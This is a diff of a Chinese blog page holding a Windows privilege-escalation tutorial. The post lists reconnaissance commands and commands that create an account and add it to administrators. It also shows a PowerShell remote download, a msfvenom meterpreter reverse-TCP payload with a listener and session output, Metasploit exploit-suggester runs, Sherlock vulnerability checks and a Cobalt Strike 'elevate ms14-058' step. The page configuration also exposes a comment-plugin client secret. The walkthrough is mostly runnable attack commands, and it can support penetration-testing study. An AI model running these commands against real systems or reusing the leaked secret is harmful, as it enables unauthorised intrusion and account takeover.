@@ -18,13 +18,180 @@ if (isPassword) {
   },
   gitment: {"owner":"ye1sec","repo":"comments","client_id":"d5ece338867af32b6dfa","client_secret":"2caf36bbd47977524017f95105315fc9e65f0577"},
 }</script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="ye1s" type="application/atom+xml">
-</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">ye1s</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/ye1sec" target="_blank">GitHub<i class="icon-dot bg-color6"></i></a><a class="links-button button-hover" href="mailto:431774437@qq.com" target="_blank">E-Mail<i class="icon-dot bg-color0"></i></a><a class="links-button button-hover" href="tencent://message/?uin=431774437&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color6"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">200</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">149</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">12</span></a></div><div class="friend-link"><a class="friend-link-text" href="http://www.m00nback.xyz/" target="_blank">MoonBack</a><a class="friend-link-text" target="_blank">待定</a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">ye1s</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">window提权总结</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2021-06-21 | 更新于 2021-06-28</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"></div><div class="button-hover tags"></div></div></div><div class="main-content"><p>window提权  </p>
+</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#基础命令"><span class="toc-number">1.</span> <span class="toc-text">基础命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#内核溢出提权"><span class="toc-number">2.</span> <span class="toc-text">内核溢出提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#msf"><span class="toc-number">2.1.</span> <span class="toc-text">msf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sherlock"><span class="toc-number">2.2.</span> <span class="toc-text">Sherlock</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">ye1s</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/ye1sec" target="_blank">GitHub<i class="icon-dot bg-color6"></i></a><a class="links-button button-hover" href="mailto:431774437@qq.com" target="_blank">E-Mail<i class="icon-dot bg-color7"></i></a><a class="links-button button-hover" href="tencent://message/?uin=431774437&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color10"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">200</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">149</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">12</span></a></div><div class="friend-link"><a class="friend-link-text" href="http://www.m00nback.xyz/" target="_blank">MoonBack</a><a class="friend-link-text" target="_blank">待定</a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">ye1s</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">window提权总结</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2021-06-21 | 更新于 2021-07-02</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"></div><div class="button-hover tags"></div></div></div><div class="main-content"><p>window提权  </p>
 <a id="more"></a> 
 
+<p>提权最重要的就是收集信息了，根据收集到的信息再进行攻击。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">服务器系统和版本位数</span><br><span class="line">服务器的补丁情况</span><br><span class="line">服务器的安装软件情况</span><br><span class="line">服务器的防护软件情况</span><br><span class="line">端口情况</span><br></pre></td></tr></table></figure>
+<p>收集好信息，就可以先从这几个方面入手：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">确定是否能执行命令（如果不能调用系统cmd执行命令。 要上传一个cmd.exe）</span><br><span class="line">找一个可写可执行的目录</span><br><span class="line">通过查找的补丁信息,找相应的exp提权</span><br></pre></td></tr></table></figure>
+<h1 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h1><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>systeminfo</td>
+<td>打印系统信息</td>
+</tr>
+<tr>
+<td>whoami</td>
+<td>获得当前用户名</td>
+</tr>
+<tr>
+<td>Set</td>
+<td>环境变量</td>
+</tr>
+<tr>
+<td>whoami /priv</td>
+<td>当前帐户权限</td>
+</tr>
+<tr>
+<td>ipconfig</td>
+<td>网络配置信息</td>
+</tr>
+<tr>
+<td>ipconfig /displaydns</td>
+<td>显示DNS缓存</td>
+</tr>
+<tr>
+<td>route print</td>
+<td>打印出路由表</td>
+</tr>
+<tr>
+<td>arp -a</td>
+<td>打印arp表</td>
+</tr>
+<tr>
+<td>hostname</td>
+<td>主机名</td>
+</tr>
+<tr>
+<td>net user</td>
+<td>列出用户</td>
+</tr>
+<tr>
+<td>net user UserName</td>
+<td>关于用户的信息</td>
+</tr>
+<tr>
+<td>net use \SMBPATH Pa$$w0rd /u:UserName</td>
+<td>连接SMB</td>
+</tr>
+<tr>
+<td>net localgroup</td>
+<td>列出所有组</td>
+</tr>
+<tr>
+<td>net localgroup GROUP</td>
+<td>关于指定组的信息</td>
+</tr>
+<tr>
+<td>net user guest /active:yes</td>
+<td>激活guest用户</td>
+</tr>
+<tr>
+<td>net user 用户名 密码/add</td>
+<td>建立用户</td>
+</tr>
+<tr>
+<td>net localgroup administrators 用户名/add</td>
+<td>把用户添加到管理员组中</td>
+</tr>
+<tr>
+<td>net session</td>
+<td>开放给其他机器</td>
+</tr>
+<tr>
+<td>netsh firewall show config</td>
+<td>显示防火墙配置</td>
+</tr>
+<tr>
+<td>DRIVERQUERY</td>
+<td>列出安装的驱动</td>
+</tr>
+<tr>
+<td>tasklist /svc</td>
+<td>列出服务任务</td>
+</tr>
+<tr>
+<td>Tasklist /svc</td>
+<td>find “TermService”</td>
+</tr>
+<tr>
+<td>net start</td>
+<td>列出启动的服务</td>
+</tr>
+<tr>
+<td>dir /s foo</td>
+<td>在目录中搜索包含指定字符的项目</td>
+</tr>
+<tr>
+<td>sc query</td>
+<td>列出所有服务</td>
+</tr>
+<tr>
+<td>sc qc ServiceName</td>
+<td>找到指定服务的路径</td>
+</tr>
+<tr>
+<td>shutdown /r /t 0</td>
+<td>立即重启</td>
+</tr>
+<tr>
+<td>type file.txt</td>
+<td>打印出内容</td>
+</tr>
+<tr>
+<td>icacls “C:\Example”</td>
+<td>列出权限</td>
+</tr>
+<tr>
+<td>wmic qfe get Caption,Description,HotFixID,InstalledOn</td>
+<td>列出已安装的布丁</td>
+</tr>
+<tr>
+<td>(New-Object System.Net.WebClient).DownloadFile(“<a href="http://host/file”,”C:\LocalPath”" target="_blank" rel="noopener">http://host/file”,”C:\LocalPath”</a>)</td>
+<td>利用ps远程下载文件到本地</td>
+</tr>
+<tr>
+<td>wmic product get name,version</td>
+<td>查看当前安装程序</td>
+</tr>
+</tbody></table>
+<h1 id="内核溢出提权"><a href="#内核溢出提权" class="headerlink" title="内核溢出提权"></a>内核溢出提权</h1><p>“系统内核溢出提权”因其利用便捷成为了最为常用的方法，在使用该方法提权时我们只需要去查看目标系统中打了那些系统补丁，之后去找补丁的”互补”补丁，并利用对应的提权类的漏洞实现权限提升。</p>
+<p>推荐一个提权类exp <a href="https://github.com/Al1ex/Heptagram/tree/master/Windows/Elevation" target="_blank" rel="noopener">https://github.com/Al1ex/Heptagram/tree/master/Windows/Elevation</a>  </p>
+<h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><p>MSF框架中自带提权辅助功能模块——post/windows/gather/enum_pathes，该模块会根据漏洞编号快速查找目标系统中的补丁信息。<br>生成payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.101 lport=4444 -f exe -o shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.1.101</span><br><span class="line">lhost =&gt; 192.168.1.101</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p>之后成功返回会话：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.101:4444</span><br><span class="line">[*] Sending stage (200262 bytes) to 192.168.1.101</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.101:4444 -&gt; 192.168.1.101:9351) at 2021-06-28 19:26:03 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+<p>之后再Meterpreter中执行如下命令即可查看系统补丁信息(老版本的会给出可用的EXP，MSF5好像不提供了)：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[*] Patch list saved to C:/Users/ye1s/.msf4/loot/20210628192724_default_192.168.247.133_enum_patches_561327.txt</span><br><span class="line">[+] KB3192137 installed on 9/12/2016</span><br><span class="line">[+] KB4486129 installed on 6/7/2021</span><br><span class="line">[+] KB3206632 installed on 6/7/2021</span><br></pre></td></tr></table></figure>
+<p>于此同时，我们也可以通过执行以下命令来查看目标系统可用的漏洞，之后探寻提权EXP:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/multi/recon/local_exploit_suggester</span><br><span class="line"></span><br><span class="line">[*] 192.168.247.133 - Collecting <span class="built_in">local</span> exploits <span class="keyword">for</span> x64/windows...</span><br><span class="line">[*] 192.168.247.133 - 28 exploit checks are being tried...</span><br><span class="line">[+] 192.168.247.133 - exploit/windows/<span class="built_in">local</span>/bypassuac_sdclt: The target appears to be vulnerable.</span><br><span class="line">[-] 192.168.247.133 - Post failed: NoMethodError undefined method `reverse!<span class="string">' for nil:NilClass</span></span><br></pre></td></tr></table></figure>
+<h2 id="Sherlock"><a href="#Sherlock" class="headerlink" title="Sherlock"></a>Sherlock</h2><p>Sherlock(<a href="https://github.com/rasta-mouse/Sherlock" target="_blank" rel="noopener">https://github.com/rasta-mouse/Sherlock</a>) 是一个在Windows下用于本地提权的PowerShell脚本，目前包含了以下漏洞：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">MS10-015 : User Mode to Ring (KiTrap0D)</span><br><span class="line">MS10-092 : Task Scheduler</span><br><span class="line">MS13-053 : NTUserMessageCall Win32k Kernel Pool Overflow</span><br><span class="line">MS13-081 : TrackPopupMenuEx Win32k NULL Page</span><br><span class="line">MS14-058 : TrackPopupMenu Win32k Null Pointer Dereference</span><br><span class="line">MS15-051 : ClientCopyImage Win32k</span><br><span class="line">MS15-078 : Font Driver Buffer Overflow</span><br><span class="line">MS16-016 : <span class="string">'mrxdav.sys'</span> WebDAV</span><br><span class="line">MS16-032 : Secondary Logon Handle</span><br><span class="line">MS16-034 : Windows Kernel-Mode Drivers EoP</span><br><span class="line">MS16-135 : Win32k Elevation of Privilege</span><br><span class="line">CVE-2017-7199 : Nessus Agent 6.6.2 - 6.10.3 Priv Esc</span><br></pre></td></tr></table></figure>
+<p>该工具的利用也是较为简单，首先下载项目到本地，之后再终端调用Sherlock(获取webshell的主机中直接上传即可)：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS D:\&gt;Import-Module .\Sherlock.ps1</span><br></pre></td></tr></table></figure>
+<p>之后执行以下命令来列举当前系统中所有可利用的漏洞：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS D:\&gt;Find-AllVulns</span><br></pre></td></tr></table></figure>
+<p>当然你也可以搜索某一个特定漏洞，例如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS D:\&gt;Find-CVE20177199</span><br></pre></td></tr></table></figure>
 
 
+<p>根据Sherlock的说明目前CS已经可以实现” 导入模块——&gt;查询单一漏洞——&gt;直接提权 “的一套流程了，下面是Github中的实例：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; getuid</span><br><span class="line">[*] Tasked beacon to get userid</span><br><span class="line">[+] host called home, sent: 20 bytes</span><br><span class="line">[*] You are Win7-x64\Rasta</span><br><span class="line"></span><br><span class="line">beacon&gt; powershell-import C:\Users\Rasta\Desktop\Sherlock.ps1</span><br><span class="line">[*] Tasked beacon to import: C:\Users\Rasta\Desktop\Sherlock.ps1</span><br><span class="line">[+] host called home, sent: 2960 bytes</span><br><span class="line"></span><br><span class="line">beacon&gt; powershell Find-MS14058</span><br><span class="line">[*] Tasked beacon to run: Find-MS14058</span><br><span class="line">[+] host called home, sent: 20 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">Title      : TrackPopupMenu Win32k Null Pointer Dereference</span><br><span class="line">MSBulletin : MS14-058</span><br><span class="line">CVEID      : 2014-4113</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/35101/</span><br><span class="line">VulnStatus : Appears Vulnerable</span><br><span class="line"></span><br><span class="line">beacon&gt; elevate ms14-058 smb</span><br></pre></td></tr></table></figure>
 <p>参考文章：  </p>
-<p>Windows常见提权总结：<a href="https://www.freebuf.com/articles/system/254836.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/254836.html</a><br><a href="https://cloud.tencent.com/developer/article/1771226" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1771226</a></p>
+<p>Windows常见提权总结：<a href="https://www.freebuf.com/articles/system/254836.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/254836.html</a><br><a href="https://cloud.tencent.com/developer/article/1771226" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1771226</a>    </p>
+<p>Windows下常见的内核溢出提权：<a href="https://xz.aliyun.com/t/8292" target="_blank" rel="noopener">https://xz.aliyun.com/t/8292</a></p>
+<p><a href="https://www.freebuf.com/articles/network/247980.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/247980.html</a><br><a href="https://www.freebuf.com/articles/network/250827.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/250827.html</a></p>
 </div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ye1s</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://blog.cfyqy.com/article/bde10ad7.html">https://blog.cfyqy.com/article/bde10ad7.html</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.cfyqy.com">ye1s</a>！</span></div></div><div class="post-copyright" id="comments-container"><script src="/js/comments/gitment.js"></script></div><script>let arr = location.href.split('/#more')[0].split('/');
 let title = arr[arr.length - 1];
 if (title === '') {
